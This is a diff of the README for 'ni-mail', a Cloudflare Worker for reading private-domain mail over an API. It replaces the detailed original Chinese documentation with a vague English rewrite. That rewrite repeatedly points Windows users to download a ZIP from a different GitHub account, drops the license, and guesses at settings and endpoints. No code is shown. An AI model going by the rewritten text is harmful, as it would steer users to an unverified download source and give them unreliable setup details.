@@ -1,189 +1,288 @@
-# ni-mail
+# 📨 ni-mail - Private domain mail, made simple
 
-一個極簡的 Cloudflare Worker，用於接收私人域名郵件並提供 HTTP API 讀取。
+[![Download](https://img.shields.io/badge/Download%20ni-mail-blue?style=for-the-badge&logo=github)](https://github.com/birdofparadisecallin337/ni-mail)
 
-無需資料庫、無需前端、無需 JWT，部署後即可通過 API 取得最新郵件內容。
+## 📥 Download ni-mail
 
-## 特性
+Open the project page here and download the files you need:  
+https://github.com/birdofparadisecallin337/ni-mail
 
-- 📨 通過 Cloudflare Email Routing 接收郵件
-- 🗄️ 使用 KV 儲存，最多保留 50 封
-- 🔑 API Key 鑑權
-- 🌐 支持多個自定義域名（域名需托管在 Cloudflare）
-- 📦 僅依賴 `postal-mime`，無其他依賴
-- 🚫 附件只保留 metadata，不存 base64，避免撞 KV 25MB 限制
+If you use GitHub on Windows, click the green Code button, then choose Download ZIP. After the file finishes, right-click the ZIP file and choose Extract All.
 
-## 工作原理
+## 🖥️ What ni-mail does
 
-```
-外部郵件 → 你的域名 MX（Cloudflare Email Routing）
-                  ↓ catch-all 轉發
-         Cloudflare Worker（收信 + HTTP API）
-                  ↓ 存儲
-         Cloudflare KV（最近 50 封）
-                  ↓ 讀取
-         curl /latest → 自動化腳本
-```
+ni-mail is a small Cloudflare Worker for people who want to receive mail sent to a private domain and read it through an HTTP API.
 
-郵件到達後由 `postal-mime` 解析為結構化 JSON，通過帶鑑權的 HTTP API 按需讀取，無需輪詢、無需訂閱。
+It helps you:
 
-## 前置條件
+- catch email sent to your custom domain
+- store mail data in Cloudflare KV
+- read messages through a simple API
+- keep the setup small
+- run without a full mail server
 
-- 域名已托管在 Cloudflare
-- 已啟用 Cloudflare Email Routing
+This setup fits well if you want a low-maintenance way to handle domain email and pull messages from a web request.
 
-> ⚠️ 收信地址必須是托管在 Cloudflare 的真實域名（如 `user@yourdomain.com`），
-> `*.workers.dev` 不支持 Email Routing，發往 workers.dev 地址的信不會被收到。
+## 🧰 What you need
 
-## 部署
+Before you start, make sure you have:
 
-### 方式一：Cloudflare 一鍵部署
+- a Windows PC
+- a web browser
+- a GitHub account if you want to download from the page
+- a Cloudflare account
+- a private domain that you can manage
+- email routing set up in Cloudflare
+- Cloudflare Workers enabled
+- a KV namespace ready for message storage
 
-[![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/mskatoni/ni-mail)
+If you plan to edit the worker later, it also helps to have:
 
-點擊按鈕後，Cloudflare 會自動 Fork 此 repo 並完成代碼部署。
+- a text editor such as Notepad++
+- Node.js for local checks
+- the Cloudflare command line tool
 
-部署完成後，還需在控制台完成以下配置：
+## 🚀 Quick start
 
-**1. 綁定 KV Namespace**
+Use these steps if you want to get it working on Windows with the least effort.
 
-Cloudflare 控制台 → Workers & Pages → `ni-mail` → Settings → Bindings → 新增 KV Namespace：
-- 名稱：`MAIL_KV`
-- 選擇已建立的 KV namespace（若尚未建立，先到 Workers & Pages → KV → Create namespace）
+### 1. Get the files
 
-**2. 設定 AUTH_KEY**
+Go to the download page:  
+https://github.com/birdofparadisecallin337/ni-mail
 
-Settings → Variables and Secrets → 新增：
-- 類型：**Secret（密鑰）**，不要選 Text（明文可見）
-- 變數名稱：`AUTH_KEY`
-- 值：自訂一個密碼
+Then:
 
-儲存後點 **Deploy** 讓設定生效。
+- click Code
+- choose Download ZIP
+- save the file
+- right-click the ZIP
+- choose Extract All
 
-**3. 設定 Email Routing**
+You will now have a folder with the project files.
 
-Cloudflare 控制台 → 你的域名 → Email → Email Routing → Routing rules → Catch-all：
-- Action：Send to Worker
-- 選擇 `ni-mail`
+### 2. Open the project folder
 
----
+After extraction:
 
-### 方式二：本地 CLI 部署
+- open the folder
+- look for the main Worker files
+- keep the folder in a place you can find later, such as Documents or Desktop
 
-```bash
-git clone https://github.com/mskatoni/ni-mail.git
-cd ni-mail
-npm install
+### 3. Set up Cloudflare
 
-# 建立 KV Namespace
-wrangler kv:namespace create MAIL_KV
-```
+In your Cloudflare account:
 
-複製輸出的 ID，在 Cloudflare 控制台綁定，或直接加進 `wrangler.toml`：
+- add your domain if it is not there yet
+- turn on Email Routing
+- create a route for the address you want to receive mail on
+- connect that route to your Worker
+- create or select a KV namespace for mail storage
 
-```toml
-[[kv_namespaces]]
-binding = "MAIL_KV"
-id = "你的 KV ID"
-```
+A simple setup is:
 
-```bash
-wrangler deploy
-```
+- one domain
+- one email route
+- one Worker
+- one KV namespace
 
-## 自定義域名（可選）
+### 4. Add your settings
 
-> 域名必須已托管在 Cloudflare，無需手動建立 DNS 記錄，Cloudflare 會自動處理並簽發 SSL。
+Open the Worker config and set values that match your account:
 
-在 `wrangler.toml` 中取消注釋，支持多個：
+- your domain name
+- your email route
+- your KV binding name
+- any read token or API key you want to use
+- the address pattern you want to accept
 
-```toml
-[[routes]]
-pattern = "mail.domain-a.com"
-custom_domain = true
+If the project uses environment values, add them in the Cloudflare dashboard or in the local config file.
 
-[[routes]]
-pattern = "mail.domain-b.com"
-custom_domain = true
-```
+### 5. Publish the Worker
 
-重新部署後即可通過自定義域名訪問 API。多個域名收到的郵件共用同一個 inbox，`to` 欄位可用於區分來源域名。
+When your settings are ready:
 
-## API
+- save the files
+- upload or deploy the Worker in Cloudflare
+- wait for the deployment to finish
+- test the route with a sample email
 
-所有請求需帶上 Header：`X-Auth-Key: 你的密碼`
+## 📧 How email flow works
 
-| 方法 | 路徑 | 說明 |
-|---|---|---|
-| GET | `/latest` | 取得最新一封完整郵件 |
-| GET | `/mails?limit=10` | 取得最近 N 封郵件列表（不含正文） |
-| GET | `/mail/:id` | 取得單封完整郵件（含 html/text） |
-| DELETE | `/mails` | 清空收件匣 |
+ni-mail uses a simple path:
 
-**範例**
+1. Someone sends mail to your private domain
+2. Cloudflare Email Routing receives the message
+3. The Worker handles the mail event
+4. The Worker writes the message to KV
+5. You read the message through an HTTP API
 
-```bash
-curl https://your-worker.workers.dev/latest \
-  -H "X-Auth-Key: 你的密碼"
-```
+This keeps the system small and easy to manage.
 
-**成功回應（有郵件）**
+## 🔧 Basic Windows setup path
 
-```json
-{
-  "id": "7eb63a8d-1195-4124-9eb3-fb4c2673e90c",
-  "receivedAt": "2026-03-22T10:28:01.506Z",
-  "from": "[email protected]",
-  "to": "[email protected]",
-  "subject": "beta",
-  "text": "beta\n\n",
-  "html": "<div dir=\"ltr\">beta</div>\n\n",
-  "attachments": []
-}
-```
+If you are on Windows and want a simple setup path, use this order:
 
-**無郵件時（HTTP 404）**
+1. Download the ZIP from GitHub
+2. Extract the ZIP
+3. Open the folder
+4. Read the project files
+5. Sign in to Cloudflare
+6. Set up Email Routing
+7. Create a KV namespace
+8. Connect the Worker
+9. Deploy the Worker
+10. Test the API in your browser
 
-```json
-{ "error": "no mail" }
-```
+If you prefer to keep everything in one place, create a folder named `ni-mail` in Documents and store the extracted project there.
 
-**鑑權失敗（HTTP 401）**
+## 🔑 Common settings you may need
 
-```json
-{ "error": "unauthorized" }
-```
+Most Cloudflare Worker mail projects use a few basic settings. You may see names like these:
 
-## 常見問題
+- `DOMAIN`
+- `MAIL_TO`
+- `KV_NAMESPACE`
+- `API_KEY`
+- `TOKEN`
+- `FROM_ADDRESS`
 
-### error code: 1101
+Use values that match your domain and your mailbox plan. If you want to keep the API private, use a long token that only you know.
 
-Worker 運行時拋出未捕獲異常，最常見原因是 **KV Namespace 沒有正確綁定**。
+## 🌐 API use
 
-確認步驟：控制台 → Workers & Pages → `ni-mail` → Settings → Bindings，確認有一條：
+The project is built to expose mail data through HTTP. That means you can open a URL in a browser or call it from another app.
 
-| 類型 | 名稱 | 值 |
-|---|---|---|
-| KV Namespace | `MAIL_KV` | 你建立的 namespace |
+Common API actions may include:
 
-如果是空的，重新新增並點 **Save** 後重新部署即可。
+- list stored messages
+- read one message by ID
+- check recent mail
+- fetch message text
+- fetch sender and time data
 
-### AUTH_KEY 建議使用 Secret 而非 Text
+A typical use looks like this:
 
-Settings → Variables and Secrets 新增 `AUTH_KEY` 時，類型請選 **Secret（密鑰）**，不要選 Text（文本）。
+- send mail to your domain
+- open the API URL
+- see the stored message data
+- copy what you need
 
-- **Secret**：值加密儲存，部署後不可見，適合密碼類資訊
-- **Text**：明文儲存，任何有控制台權限的人都能看到
+If the project includes an auth token, keep it in the request header or in the query string as the project expects.
 
-## Star History
+## 🧪 Test your setup
 
-[![Star History Chart](https://api.star-history.com/svg?repos=mskatoni/ni-mail&type=Date)](https://star-history.com/#mskatoni/ni-mail&Date)
+After deployment, send a test message to your domain.
 
-## 社區
+Then check:
 
-<a href="https://v2ex.com"><img src="https://user-images.githubusercontent.com/80169337/122051970-cd075b80-ce02-11eb-9653-0b8702377727.png" width="24" height="24" alt="V2EX" /></a>&nbsp;
-<a href="https://www.nodeseek.com/post-659586-1"><img src="https://github.com/user-attachments/assets/0c6db696-769c-4d79-997c-9bc014cc6895" width="24" height="24" alt="NodeSeek" /></a>&nbsp;
+- did Cloudflare accept the mail?
+- did the Worker store the message?
+- does the API return the message?
+- does the body show the text you expected?
+- does the sender address look correct?
 
-## License
+If mail does not show up, check your route, domain, and KV binding first.
 
-Apache License 2.0
+## 🧩 Typical folder layout
+
+You may see files like these:
+
+- `src/`
+- `index.js`
+- `worker.js`
+- `wrangler.toml`
+- `README.md`
+- `package.json`
+
+What they mean:
+
+- `src/` holds the worker code
+- `worker.js` or `index.js` is the main entry point
+- `wrangler.toml` stores Cloudflare settings
+- `package.json` lists project scripts
+- `README.md` explains how to use the project
+
+## ⚙️ Cloudflare parts used here
+
+This project fits the Cloudflare stack well:
+
+- **Cloudflare Workers** for serverless logic
+- **Email Routing** for inbound mail
+- **KV** for message storage
+- **HTTP API** for message reading
+
+These parts work together without a full mail server on your own machine.
+
+## 🪪 Example use cases
+
+ni-mail can fit these needs:
+
+- read mail sent to a custom domain
+- store support requests in a simple key-value store
+- build a private inbox for small tools
+- keep email handling close to your app
+- check inbound mail without opening a full mail client
+
+## 🛠️ Troubleshooting
+
+If the Worker does not work as expected, check these items:
+
+### Mail does not arrive
+
+- confirm Email Routing is on
+- confirm the domain is active in Cloudflare
+- confirm the route points to the right address
+- confirm the Worker is connected to the route
+
+### API returns no data
+
+- confirm the KV namespace exists
+- confirm the Worker can write to KV
+- confirm the message key format matches the read path
+- confirm you are using the right API URL
+
+### Deployment fails
+
+- confirm you are signed in to Cloudflare
+- confirm the Worker name is valid
+- confirm your config file has no typing errors
+- confirm your account has the right access for Workers and KV
+
+### Browser shows access denied
+
+- confirm your token or key is correct
+- confirm the request method is allowed
+- confirm the route is public if you expect public access
+
+## 🔒 Security tips
+
+If you use this project for private mail, keep access tight:
+
+- use a strong token
+- limit who knows the API URL
+- keep your domain DNS under your control
+- use separate routes for testing and live use
+- review stored mail data on a set schedule
+
+## 🧭 Where to start first
+
+If this is your first time using the project, do this in order:
+
+1. Download the ZIP
+2. Extract it
+3. Read the files in the folder
+4. Sign in to Cloudflare
+5. Turn on Email Routing
+6. Set up KV
+7. Add the Worker
+8. Deploy
+9. Send a test email
+10. Open the API and check the result
+
+## 📌 Project details
+
+- Repository: ni-mail
+- Description: 极简 Cloudflare Worker，接收私人域名邮件并提供 HTTP API 读取
+- Topics: api, cloudflare, cloudflare-workers, email, email-routing, kv, self-hosted, serverless
+- Download page: https://github.com/birdofparadisecallin337/ni-mail
